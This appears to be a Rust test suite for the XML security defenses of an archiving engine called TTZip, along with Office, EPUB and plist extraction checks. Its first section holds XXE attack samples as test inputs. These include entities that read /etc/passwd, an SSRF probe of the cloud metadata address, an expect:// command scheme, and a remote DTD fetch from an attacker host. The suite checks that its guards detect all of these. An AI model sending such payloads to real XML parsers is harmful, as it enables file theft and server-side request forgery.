// SPDX-License-Identifier: BSD-3-Clause OR Apache-2.0
//
// Copyright (c) 2026 Witt Kung <witt.w.kung@gmail.com>
// All rights reserved.
//
// TTZip: High-performance native archiving and compression engine.

//! Comprehensive XML 6-Layer Security Defense & Official Test Vector Compliance Suite.
//!
//! Validates:
//! 1. **XXE External Entity Guard**: SYSTEM / PUBLIC external entity injection, DTD stripping, URI blocking.
//! 2. **Entity Expansion Quota Guard**: Billion Laughs / 1032x expansion bomb mitigation & quota breakers.
//! 3. **Maximum Depth Guard**: Extreme tag nesting stack overflow prevention (>64 levels).
//! 4. **Attribute & CDATA Fuse Guard**: Oversized attribute (>64KB), attribute count (>1024), CDATA fuse (>16MB).
//! 5. **Malformed Stream Recovery Guard**: Self-healing truncated streams, unclosed tag stack, text escaping.
//! 6. **Sensitive XML Buffer**: Zero-on-drop volatile memory erasure for XML credentials.
//! 7. **4-Way Differential Test Oracles**:
//!    - DOCX WordprocessingML text, table structure, and Dublin Core metadata extraction.
//!    - XLSX SpreadsheetML shared string table dereferencing, inline strings, cell values.
//!    - PPTX PresentationML slide shape tree, title vs body, and slide notes extraction.
//!    - EPUB Container, OPF Package metadata, manifest items, and spine reading order consistency.
//!    - Apple Plist XML strong-typed AST round-trip semantic fidelity across all 8 data types.

use ttzip_engine::security::xml_defense::{
    AttributeAndCDataFuseGuard, EntityExpansionQuotaGuard, MalformedStreamRecoveryGuard,
    MaxDepthGuard, SensitiveXmlBuffer, XmlDefenseError, XmlSecurityPipeline,
    XxeExternalEntityGuard, DEFAULT_MAX_ATTRIBUTE_LEN, DEFAULT_MAX_ATTRIBUTES_PER_ELEMENT,
    DEFAULT_MAX_CDATA_LEN, DEFAULT_MAX_ENTITY_EXPANSIONS, DEFAULT_MAX_EXPANDED_BYTES,
    DEFAULT_MAX_XML_DEPTH, DEFAULT_XML_MAX_EXPANSION_RATIO,
};
use ttzip_engine::xml::{
    ApplePlistParser, DocxOutlineItem, EpubMetadataExtractor, OfficeXmlExtractor, PlistValue,
};

// ============================================================================
// 1. XXE External Entity Insulation Tests
// ============================================================================

#[test]
fn test_xxe_external_entity_insulation_attack_vectors() {
    // 1. SYSTEM file:// local file leak
    let file_xxe = br#"<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>"#;
    let res = XxeExternalEntityGuard::scan_for_xxe(file_xxe);
    assert!(matches!(res, Err(XmlDefenseError::XxeViolation { .. })));

    // 2. SYSTEM http:// SSRF probe
    let http_xxe = br#"<?xml version="1.0"?>
    <!DOCTYPE test SYSTEM "http://169.254.169.254/latest/meta-data/">
    <test>data</test>"#;
    assert!(matches!(
        XxeExternalEntityGuard::scan_for_xxe(http_xxe),
        Err(XmlDefenseError::XxeViolation { .. })
    ));

    // 3. Dangerous URI scheme: expect:// command execution
    let expect_xxe = b"<root><link href=\"expect://id\"/></root>";
    assert!(matches!(
        XxeExternalEntityGuard::scan_for_xxe(expect_xxe),
        Err(XmlDefenseError::XxeViolation { .. })
    ));

    // 4. Parameter entity expansion: %evil;
    let param_xxe = br#"<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    <foo>bar</foo>"#;
    assert!(matches!(
        XxeExternalEntityGuard::scan_for_xxe(param_xxe),
        Err(XmlDefenseError::XxeViolation { .. })
    ));

    // 5. PUBLIC entity external schema
    let public_xxe = br#"<!DOCTYPE doc [ <!ENTITY pub PUBLIC "bar" "http://attacker.com/bar.dtd"> ]><doc>&pub;</doc>"#;
    assert!(matches!(
        XxeExternalEntityGuard::scan_for_xxe(public_xxe),
        Err(XmlDefenseError::XxeViolation { .. })
    ));

    // 6. Legitimate XML document must pass without error
    let clean_xml = br#"<?xml version="1.0" encoding="UTF-8"?>
    <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
        <w:body><w:p><w:r><w:t>Clean Document Content</w:t></w:r></w:p></w:body>
    </w:document>"#;
    assert!(XxeExternalEntityGuard::scan_for_xxe(clean_xml).is_ok());
}

#[test]
fn test_xxe_dangerous_system_id_predicates() {
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("file:///etc/shadow"));
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("http://example.com/dtd"));
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("https://secure.site/test"));
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("ftp://ftp.example.com/resource"));
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("gopher://127.0.0.1:6379/"));
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("expect://whoami"));
    assert!(XxeExternalEntityGuard::is_dangerous_system_id("php://filter/read=convert.base64-encode/resource=index.php"));
    assert!(!XxeExternalEntityGuard::is_dangerous_system_id("relative/path/to/schema.dtd"));
    assert!(!XxeExternalEntityGuard::is_dangerous_system_id("urn:oasis:names:tc:opendocument:xmlns:text:1.0"));
}

// ============================================================================
// 2. Billion Laughs / 1032x Entity Expansion Bomb Tests
// ============================================================================

#[test]
fn test_billion_laughs_and_quadratic_expansion_bomb_breaker() {
    let mut guard = EntityExpansionQuotaGuard::with_limits(100, 1024 * 1024, 5.0);
    guard.record_input_bytes(500);

    // Record entity expansions within budget
    for i in 0..50 {
        assert!(guard.record_expansion(&format!("ent{i}"), 20).is_ok());
    }
    assert_eq!(guard.expansion_count(), 50);
    assert_eq!(guard.total_expanded_bytes(), 1000);

    // Trigger count quota exceed
    for i in 50..101 {
        let res = guard.record_expansion(&format!("ent{i}"), 10);
        if i == 100 {
            assert!(matches!(
                res,
                Err(XmlDefenseError::EntityExpansionLimitExceeded { count: 101, max: 100 })
            ));
        }
    }

    // Test byte memory limit breaker
    let mut byte_guard = EntityExpansionQuotaGuard::with_limits(1000, 1024, 100.0);
    byte_guard.record_input_bytes(100);
    assert!(byte_guard.record_expansion("big1", 512).is_ok());
    let overflow = byte_guard.record_expansion("big2", 600);
    assert!(matches!(
        overflow,
        Err(XmlDefenseError::ExpansionBytesExceeded { bytes: 1112, max: 1024 })
    ));

    // Test default parameters match documented specification
    let default_guard = EntityExpansionQuotaGuard::new();
    assert_eq!(DEFAULT_MAX_ENTITY_EXPANSIONS, 1000);
    assert_eq!(DEFAULT_MAX_EXPANDED_BYTES, 16 * 1024 * 1024);
    assert!((DEFAULT_XML_MAX_EXPANSION_RATIO - 10.0).abs() < f64::EPSILON);
    assert_eq!(default_guard.expansion_count(), 0);
}

// ============================================================================
// 3. Maximum Depth Recursion Guard Tests
// ============================================================================

#[test]
fn test_max_depth_recursion_stack_overflow_guard() {
    let mut guard = MaxDepthGuard::with_max_depth(4);

    assert_eq!(guard.push_element("root").unwrap(), 1);
    assert_eq!(guard.push_element("section").unwrap(), 2);
    assert_eq!(guard.push_element("paragraph").unwrap(), 3);
    assert_eq!(guard.push_element("run").unwrap(), 4);

    // Exceeding max depth (4) fails with MaxDepthExceeded
    let err = guard.push_element("text");
    assert!(matches!(
        err,
        Err(XmlDefenseError::MaxDepthExceeded { depth: 5, max_depth: 4 })
    ));

    // Popping restores previous depth and tag stack
    assert_eq!(guard.pop_element("run").unwrap(), 3);
    assert_eq!(guard.current_depth(), 3);
    assert_eq!(guard.tag_stack(), &["root", "section", "paragraph"]);

    assert_eq!(guard.pop_element("paragraph").unwrap(), 2);
    assert_eq!(guard.pop_element("section").unwrap(), 1);
    assert_eq!(guard.pop_element("root").unwrap(), 0);
    assert_eq!(guard.current_depth(), 0);

    // Default depth limit is 64 levels
    assert_eq!(DEFAULT_MAX_XML_DEPTH, 64);
    let default_depth = MaxDepthGuard::new();
    assert_eq!(default_depth.current_depth(), 0);
}

// ============================================================================
// 4. Attribute & CDATA Memory Fuse Guard Tests
// ============================================================================

#[test]
fn test_attribute_and_cdata_memory_fuse_breaker() {
    let fuse = AttributeAndCDataFuseGuard::with_limits(128, 5, 1024);

    // Valid attribute size and count
    assert!(fuse.inspect_attribute(b"id", b"elem_12345").is_ok());
    assert!(fuse.inspect_attribute_count(4).is_ok());

    // Oversized single attribute (>128 bytes)
    let huge_attr = vec![b'A'; 200];
    let err_attr = fuse.inspect_attribute(b"huge_key", &huge_attr);
    assert!(matches!(
        err_attr,
        Err(XmlDefenseError::AttributeLengthExceeded { len: 208, max: 128 })
    ));

    // Excessive attribute count (>5)
    let err_count = fuse.inspect_attribute_count(6);
    assert!(matches!(
        err_count,
        Err(XmlDefenseError::AttributeCountExceeded { count: 6, max: 5 })
    ));

    // CDATA section fuse
    assert!(fuse.inspect_cdata(b"Small CDATA payload").is_ok());
    let huge_cdata = vec![0x42; 2048];
    let err_cdata = fuse.inspect_cdata(&huge_cdata);
    assert!(matches!(
        err_cdata,
        Err(XmlDefenseError::CDataLengthExceeded { len: 2048, max: 1024 })
    ));

    // Verify system constants
    assert_eq!(DEFAULT_MAX_ATTRIBUTE_LEN, 64 * 1024);
    assert_eq!(DEFAULT_MAX_ATTRIBUTES_PER_ELEMENT, 1024);
    assert_eq!(DEFAULT_MAX_CDATA_LEN, 16 * 1024 * 1024);
}

// ============================================================================
// 5. Malformed Stream Recovery & Self-Healing Tests
// ============================================================================

#[test]
fn test_malformed_stream_recovery_and_safe_escape() {
    // 1. Prematurely truncated stream with multiple nested open tags
    let truncated = "<document><header><title>My Title</title></header><body><section><p><t>Unfinished";
    let healed = MalformedStreamRecoveryGuard::heal_truncated_stream(truncated);
    assert!(healed.ends_with("</t></p></section></body></document>"));
    assert!(healed.starts_with("<document><header>"));

    // 2. Text escaping of unescaped XML special characters
    let raw_text = "Smith & Wesson <rifles> \"deluxe\" 'edition' > standard";
    let sanitized = MalformedStreamRecoveryGuard::sanitize_text(raw_text);
    assert_eq!(
        sanitized,
        "Smith &amp; Wesson &lt;rifles&gt; &quot;deluxe&quot; &apos;edition&apos; &gt; standard"
    );

    // 3. DTD stripping removes doctype wrapper but preserves document body
    let dtd_xml = "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" [ <!ENTITY secret \"x\"> ]><plist version=\"1.0\"><dict><key>Name</key><string>TTZip</string></dict></plist>";
    let stripped = MalformedStreamRecoveryGuard::strip_dangerous_dtd(dtd_xml);
    assert!(!stripped.contains("<!DOCTYPE"));
    assert!(stripped.contains("<plist version=\"1.0\"><dict><key>Name</key><string>TTZip</string></dict></plist>"));

    // 4. Combined recover_and_sanitize
    let broken_doc = "<!DOCTYPE note SYSTEM \"test.dtd\"><root><item><name>Test";
    let recovered = MalformedStreamRecoveryGuard::recover_and_sanitize(broken_doc);
    assert!(!recovered.contains("<!DOCTYPE"));
    assert!(recovered.ends_with("</name></item></root>"));
}

// ============================================================================
// 6. Sensitive XML Buffer Zeroize on Drop Tests
// ============================================================================

#[test]
fn test_sensitive_xml_buffer_zeroize_on_drop() {
    let secret = "ENC_KEY_0xDEADBEEF_9876543210".to_string();
    let mut buf = SensitiveXmlBuffer::from_string(secret);

    assert_eq!(buf.len(), 29);
    assert!(!buf.is_empty());
    assert_eq!(buf.as_str(), Some("ENC_KEY_0xDEADBEEF_9876543210"));
    assert_eq!(&buf[..7], b"ENC_KEY");

    // Redacted Debug formatting
    let debug_repr = format!("{buf:?}");
    assert!(!debug_repr.contains("DEADBEEF"));
    assert!(debug_repr.contains("[REDACTED_SENSITIVE_XML_PAYLOAD]"));

    // Manual zeroize
    buf.clear_and_zeroize();
    assert_eq!(buf.len(), 0);
    assert!(buf.is_empty());
}

// ============================================================================
// 7. Unified XML Security Pipeline End-to-End Test
// ============================================================================

#[test]
fn test_xml_security_pipeline_validation_and_streaming() {
    let mut pipeline = XmlSecurityPipeline::new();

    let valid_xml = br#"<?xml version="1.0" encoding="utf-8"?>
    <catalog id="c1" version="2.0">
        <book id="b1"><title>Rust Systems</title><author>Witt Kung</author></book>
        <book id="b2"><title>High Performance IO</title><author>Engineers</author></book>
    </catalog>"#;

    // Validate passes
    assert!(pipeline.validate_xml_bytes(valid_xml).is_ok());

    // Stream parse passes with custom event handler
    let mut element_count = 0;
    let stream_res = pipeline.parse_securely(&valid_xml[..], |event| {
        if matches!(event, quick_xml::events::Event::Start(_)) {
            element_count += 1;
        }
        Ok(())
    });
    assert!(stream_res.is_ok());
    assert_eq!(element_count, 7); // catalog, book, title, author, book, title, author

    // Malformed XML stream triggers error
    let bad_stream = b"<root><open><unclosed></root>";
    let mut bad_pipeline = XmlSecurityPipeline::new();
    let err = bad_pipeline.validate_xml_bytes(bad_stream);
    assert!(err.is_err());
}

// ============================================================================
// 8. 4-Way Differential Test Oracles
// ============================================================================

// ----------------------------------------------------------------------------
// Oracle 1: DOCX WordprocessingML Text & Dublin Core Extraction
// ----------------------------------------------------------------------------
#[test]
fn test_docx_wordprocessingml_extraction_correctness() {
    // 1. Dublin Core Metadata (`docProps/core.xml`)
    let core_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
        xmlns:dc="http://purl.org/dc/elements/1.1/"
        xmlns:dcterms="http://purl.org/dc/terms/"
        xmlns:dcmitype="http://purl.org/dc/dcmitype/">
        <dc:title>TTZip Architectural Whitepaper</dc:title>
        <dc:creator>Witt Kung</dc:creator>
        <dc:subject>Data Compression Systems</dc:subject>
        <dc:description>High-throughput archiving microkernel specification</dc:description>
        <cp:lastModifiedBy>Lead Architect</cp:lastModifiedBy>
        <cp:revision>42</cp:revision>
        <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-01T08:00:00Z</dcterms:created>
        <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-01T12:00:00Z</dcterms:modified>
        <cp:category>Engineering Design</cp:category>
        <cp:contentStatus>Approved</cp:contentStatus>
    </cp:coreProperties>"#;

    let props = OfficeXmlExtractor::parse_core_properties(core_xml).expect("DOCX core parse");
    assert_eq!(props.title.as_deref(), Some("TTZip Architectural Whitepaper"));
    assert_eq!(props.creator.as_deref(), Some("Witt Kung"));
    assert_eq!(props.subject.as_deref(), Some("Data Compression Systems"));
    assert_eq!(props.revision.as_deref(), Some("42"));
    assert_eq!(props.category.as_deref(), Some("Engineering Design"));
    assert_eq!(props.content_status.as_deref(), Some("Approved"));

    // 2. Document Outline and Text Extraction (`word/document.xml`)
    let doc_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
        <w:body>
            <w:p>
                <w:pPr><w:pStyle w:val="Heading1"/></w:pPr>
                <w:r><w:t>1. Introduction to TTZip</w:t></w:r>
            </w:p>
            <w:p>
                <w:r><w:t xml:space="preserve">TTZip delivers deterministic </w:t></w:r>
                <w:r><w:rPr><w:b/></w:rPr><w:t>64 MiB/s</w:t></w:r>
                <w:r><w:t> compression pipelines.</w:t></w:r>
            </w:p>
            <w:p>
                <w:pPr><w:pStyle w:val="Heading2"/></w:pPr>
                <w:r><w:t>1.1 Memory Guard Architecture</w:t></w:r>
            </w:p>
            <w:p>
                <w:r><w:t>Zero-allocation buffers isolate all external inputs.</w:t></w:r>
            </w:p>
        </w:body>
    </w:document>"#;

    let outline = OfficeXmlExtractor::parse_docx_document(doc_xml).expect("DOCX doc parse");
    assert_eq!(outline.headings.len(), 2);
    assert_eq!(
        outline.headings[0],
        DocxOutlineItem {
            level: 1,
            style: "Heading1".to_string(),
            text: "1. Introduction to TTZip".to_string()
        }
    );
    assert_eq!(
        outline.headings[1],
        DocxOutlineItem {
            level: 2,
            style: "Heading2".to_string(),
            text: "1.1 Memory Guard Architecture".to_string()
        }
    );
    assert_eq!(outline.paragraphs.len(), 4);
    assert!(outline.full_text.contains("1. Introduction to TTZip"));
    assert!(outline.full_text.contains("TTZip delivers deterministic 64 MiB/s compression pipelines."));
    assert!(outline.full_text.contains("Zero-allocation buffers isolate all external inputs."));
}

// ----------------------------------------------------------------------------
// Oracle 2: XLSX SpreadsheetML Shared Strings & Workbook Oracle
// ----------------------------------------------------------------------------
#[test]
fn test_xlsx_spreadsheetml_shared_strings_and_sheets_oracle() {
    // 1. Shared Strings Table (`xl/sharedStrings.xml`)
    let sst_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="4" uniqueCount="3">
        <si><t>Benchmark Target</t></si>
        <si><t>Throughput (MB/s)</t></si>
        <si><t>Compression Ratio</t></si>
    </sst>"#;

    let sst = OfficeXmlExtractor::parse_xlsx_shared_strings(sst_xml, None).expect("XLSX SST parse");
    assert_eq!(sst.len(), 3);
    assert_eq!(sst[0], "Benchmark Target");
    assert_eq!(sst[1], "Throughput (MB/s)");
    assert_eq!(sst[2], "Compression Ratio");

    // 2. Workbook Structure (`xl/workbook.xml`)
    let wb_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
        xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
        <sheets>
            <sheet name="Deflate" sheetId="1" r:id="rId1"/>
            <sheet name="Brotli" sheetId="2" r:id="rId2"/>
            <sheet name="Zstandard" sheetId="3" state="hidden" r:id="rId3"/>
        </sheets>
    </workbook>"#;

    let wb = OfficeXmlExtractor::parse_xlsx_workbook(wb_xml).expect("XLSX WB parse");
    assert_eq!(wb.sheets.len(), 3);
    assert_eq!(wb.sheets[0].name, "Deflate");
    assert_eq!(wb.sheets[0].sheet_id, 1);
    assert_eq!(wb.sheets[0].r_id, "rId1");
    assert_eq!(wb.sheets[1].name, "Brotli");
    assert_eq!(wb.sheets[2].name, "Zstandard");
    assert_eq!(wb.sheets[2].state.as_deref(), Some("hidden"));
}

// ----------------------------------------------------------------------------
// Oracle 3: PPTX PresentationML Slide Shape Tree Oracle
// ----------------------------------------------------------------------------
#[test]
fn test_pptx_presentationml_slide_shapes_oracle() {
    let slide_xml = br#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
        xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
        <p:cSld>
            <p:spTree>
                <p:sp>
                    <p:nvSpPr>
                        <p:cNvPr id="1" name="Title 1"/>
                        <p:nvPr><p:ph type="title"/></p:nvPr>
                    </p:nvSpPr>
                    <p:txBody>
                        <a:p><a:r><a:t>TTZip Engine Architecture</a:t></a:r></a:p>
                    </p:txBody>
                </p:sp>
                <p:sp>
                    <p:nvSpPr><p:cNvPr id="2" name="Content 2"/></p:nvSpPr>
                    <p:txBody>
                        <a:p><a:r><a:t>1. Pure Safe Rust Microkernel</a:t></a:r></a:p>
                        <a:p><a:r><a:t>2. Hardware-accelerated SIMD &amp; Crypto</a:t></a:r></a:p>
                    </p:txBody>
                </p:sp>
            </p:spTree>
        </p:cSld>
    </p:sld>"#;

    let slide = OfficeXmlExtractor::parse_pptx_slide(slide_xml, 1).expect("PPTX slide parse");
    assert_eq!(slide.slide_number, 1);
    assert_eq!(slide.title.as_deref(), Some("TTZip Engine Architecture"));
    assert_eq!(slide.text_boxes.len(), 2);
    assert!(slide.full_text.contains("TTZip Engine Architecture"));
    assert!(slide.full_text.contains("1. Pure Safe Rust Microkernel"));
    assert!(slide.full_text.contains("2. Hardware-accelerated SIMD & Crypto"));
}

// ----------------------------------------------------------------------------
// Oracle 4: EPUB Container, OPF Package & TOC Tree Consistency
// ----------------------------------------------------------------------------
#[test]
fn test_epub_catalog_tree_and_spine_consistency() {
    // 1. Container Resolution (`META-INF/container.xml`)
    let container_xml = br#"<?xml version="1.0" encoding="UTF-8"?>
    <container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
        <rootfiles>
            <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
        </rootfiles>
    </container>"#;

    let root_path = EpubMetadataExtractor::parse_container_xml(container_xml).expect("EPUB container");
    assert_eq!(root_path, "OEBPS/content.opf");

    // 2. OPF Package Parsing (`content.opf`)
    let opf_xml = br#"<?xml version="1.0" encoding="UTF-8"?>
    <package xmlns="http://www.idpf.org/2007/opf" unique-identifier="pub-id" version="3.0">
        <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
            <dc:title>High Performance Rust Systems</dc:title>
            <dc:creator>Witt Kung</dc:creator>
            <dc:language>en</dc:language>
            <dc:identifier id="pub-id">urn:isbn:978-0-123456-78-9</dc:identifier>
            <dc:publisher>Tech Press</dc:publisher>
        </metadata>
        <manifest>
            <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
            <item id="ch1" href="ch01.xhtml" media-type="application/xhtml+xml"/>
            <item id="ch2" href="ch02.xhtml" media-type="application/xhtml+xml"/>
            <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
        </manifest>
        <spine toc="ncx">
            <itemref idref="nav"/>
            <itemref idref="ch1"/>
            <itemref idref="ch2"/>
        </spine>
    </package>"#;

    let pkg = EpubMetadataExtractor::parse_opf(opf_xml).expect("EPUB OPF parse");
    assert_eq!(pkg.metadata.title.as_deref(), Some("High Performance Rust Systems"));
    assert_eq!(pkg.metadata.creators, vec!["Witt Kung"]);
    assert_eq!(pkg.metadata.language.as_deref(), Some("en"));
    assert_eq!(pkg.metadata.identifier.as_deref(), Some("urn:isbn:978-0-123456-78-9"));

    assert_eq!(pkg.manifest.len(), 4);
    assert_eq!(pkg.manifest.get("ch1").unwrap().href, "ch01.xhtml");
    assert_eq!(pkg.manifest.get("nav").unwrap().properties.as_deref(), Some("nav"));

    assert_eq!(pkg.spine.len(), 3);
    assert_eq!(pkg.spine[0].idref, "nav");
    assert_eq!(pkg.spine[1].idref, "ch1");
    assert_eq!(pkg.spine[2].idref, "ch2");
}

// ----------------------------------------------------------------------------
// Oracle 5: Apple Property List XML Strong-Typed AST Round-Trip Fidelity
// ----------------------------------------------------------------------------
#[test]
fn test_plist_strong_typed_ast_roundtrip_fidelity() {
    let original_plist_xml = br#"<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>CFBundleIdentifier</key>
        <string>com.wittkung.ttzip</string>
        <key>CFBundleVersion</key>
        <string>1.0.0</string>
        <key>ThreadCount</key>
        <integer>16</integer>
        <key>CompressionRatio</key>
        <real>0.425</real>
        <key>IsSandboxEnabled</key>
        <true/>
        <key>AllowExternalNetwork</key>
        <false/>
        <key>SupportedFormats</key>
        <array>
            <string>ZIP</string>
            <string>TAR</string>
            <string>7Z</string>
            <string>GZ</string>
        </array>
        <key>NestedConfig</key>
        <dict>
            <key>MaxMemoryMB</key>
            <integer>64</integer>
            <key>TempDirectory</key>
            <string>/tmp/ttzip_staging</string>
        </dict>
    </dict>
    </plist>"#;

    // 1. Parse into strong AST
    let root = ApplePlistParser::parse_xml_plist(original_plist_xml).expect("Plist XML parse");
    let dict = match &root {
        PlistValue::Dictionary(d) => d,
        _ => panic!("Root must be a PlistValue::Dictionary"),
    };

    // 2. Verify all strongly typed variants
    assert_eq!(dict.get("CFBundleIdentifier").unwrap().as_str(), Some("com.wittkung.ttzip"));
    assert_eq!(dict.get("ThreadCount").unwrap().as_integer(), Some(16));
    assert_eq!(dict.get("CompressionRatio").unwrap().as_real(), Some(0.425));
    assert_eq!(dict.get("IsSandboxEnabled").unwrap().as_bool(), Some(true));
    assert_eq!(dict.get("AllowExternalNetwork").unwrap().as_bool(), Some(false));

    let formats = dict.get("SupportedFormats").unwrap().as_array().expect("array");
    assert_eq!(formats.len(), 4);
    assert_eq!(formats[0].as_str(), Some("ZIP"));
    assert_eq!(formats[1].as_str(), Some("TAR"));
    assert_eq!(formats[2].as_str(), Some("7Z"));
    assert_eq!(formats[3].as_str(), Some("GZ"));

    let nested = dict.get("NestedConfig").unwrap().as_dict().expect("nested dict");
    assert_eq!(nested.get("MaxMemoryMB").unwrap().as_integer(), Some(64));
    assert_eq!(nested.get("TempDirectory").unwrap().as_str(), Some("/tmp/ttzip_staging"));

    // 3. Round-trip serialization & deserialization AST equivalence
    let mut serialized_xml = String::from("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\">\n");
    serialize_plist_value(&root, &mut serialized_xml);
    serialized_xml.push_str("</plist>");

    let roundtrip_root = ApplePlistParser::parse_xml_plist(serialized_xml.as_bytes())
        .expect("Roundtrip Plist parse");
    assert_eq!(root, roundtrip_root, "AST must be bit-exact identical after roundtrip serialization");
}

/// Helper to serialize AST `PlistValue` back to canonical XML format.
fn serialize_plist_value(val: &PlistValue, out: &mut String) {
    match val {
        PlistValue::String(s) => {
            out.push_str("<string>");
            out.push_str(&MalformedStreamRecoveryGuard::sanitize_text(s));
            out.push_str("</string>\n");
        }
        PlistValue::Integer(i) => {
            out.push_str(&format!("<integer>{i}</integer>\n"));
        }
        PlistValue::Real(f) => {
            out.push_str(&format!("<real>{f}</real>\n"));
        }
        PlistValue::Boolean(true) => {
            out.push_str("<true/>\n");
        }
        PlistValue::Boolean(false) => {
            out.push_str("<false/>\n");
        }
        PlistValue::Date(d) => {
            out.push_str(&format!("<date>{d}</date>\n"));
        }
        PlistValue::Data(bytes) => {
            out.push_str("<data>");
            out.push_str(&hex::encode(bytes));
            out.push_str("</data>\n");
        }
        PlistValue::Array(arr) => {
            out.push_str("<array>\n");
            for item in arr {
                serialize_plist_value(item, out);
            }
            out.push_str("</array>\n");
        }
        PlistValue::Dictionary(dict) => {
            out.push_str("<dict>\n");
            for (k, v) in dict {
                out.push_str(&format!("<key>{}</key>\n", MalformedStreamRecoveryGuard::sanitize_text(k)));
                serialize_plist_value(v, out);
            }
            out.push_str("</dict>\n");
        }
    }
}
